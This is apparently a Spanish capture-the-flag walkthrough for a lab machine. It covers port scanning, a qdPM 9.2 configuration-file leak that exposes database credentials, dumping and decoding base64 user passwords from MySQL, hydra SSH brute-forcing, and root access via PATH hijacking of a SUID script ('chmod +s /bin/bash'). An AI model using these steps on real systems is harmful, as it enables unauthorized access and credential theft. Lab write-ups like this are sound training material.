PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx

-Visitamos el puerto 80 y nos encontramos un panel de login con el siguiente servicio y versión:
	qdPM 9.2

-Buscamos exploits y encontramos el siguiente recurso:
	https://www.exploit-db.com/exploits/50176
	 -Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)

-Podemos ver las credenciales de la BBDD si nos vamos a la siguiente ruta:
	http://192.168.1.140/core/config/databases.yml
	dsn: 'mysql:dbname=qdpm;host=localhost'
    username: qdpmadmin
	password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"

-Nos autenticamos en mysql remotamente con las credenciales obtenidas:
	mysql -u qdpmadmin -pUcVQCMQk2STVeS6J -h 192.168.1.140 -P 3306 --ssl=0
	- -ssl=0: Esto desactiva el certificado ssl, sino no funciona

-En la tabla configuration encontramos el email del admin y su contraseña pero es un Rabbit Hole.

-Cambiamos a la database 'staff' y seleccionamos el contenido de las tables users y login. Encontramos una serie de usuarios y contraseñas (las contraseñas en base 64).

-Metemos los usuarios en un archivo users.txt. Importante poner los nombres en minúscula, ya que vamos a intentar autenticarnos por ssh y no acepta nombres en mayúscula.

-Metemos las contraseñas en base64 en passwords.txt.

-Vamos a crear un bucle en bash que recorra todas las contraseñas en base64 de mi archivo passwords.txt , nos reporte el output decodificado y lo meta de nuevo en el fichero passwords.txt:
	for password in $(cat passwords.txt); do
	echo $password | base64 -d;echo;done 
	-output decodificado:
		suRJAdGwLp8dy3rF
		7ZwV4qtg42cmUXGX
		X7MQkP3W29fewHdC
		DJceVy98W28Y7wLg
		cqNnBWCByS2DuJSy

-Usamos hydra para probar los usuarios y las contraseñas en el servicio ssh:
	-hydra ssh://192.168.1.140 -L users.txt -P passwords.txt 
		login: travis   password: DJceVy98W28Y7wLg
		login: dexter   password: 7ZwV4qtg42cmUXGX

-Nos autenticamos por ssh con travis o con dexter y estamos dentro
travis@debian


## Escalada de Privilegios

-Tenemos permisos SUID sobre el siguiente script:
	/opt/get_access

-Observamos su contenido y vemos que uno de los comandos que ejecuta en 'cat' sin utilizar la ruta absoluta, por lo que podemos hacer un Path Hijacking.

-Vamos al directorio /tmp ya que tenemos permisos de escritura y creamos un archivo llamado 'cat'. Dentro insertamos el comando --> chmod +s /bin/bash

-Manipulamos el PATH del sistema para que empiece a buscar binarios desde el directorio /tmp y ejecute nuestro archivo 'cat' malicioso:
	-export PATH=/tmp:$PATH
	-comprobamos que el PATH ha cambiado:
		-echo $PATH:
			/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

-Ejecutamos el script y obtenemos permisos de root:
	/opt/get_access
	bash -p
	bash-5.1# whoami
	root
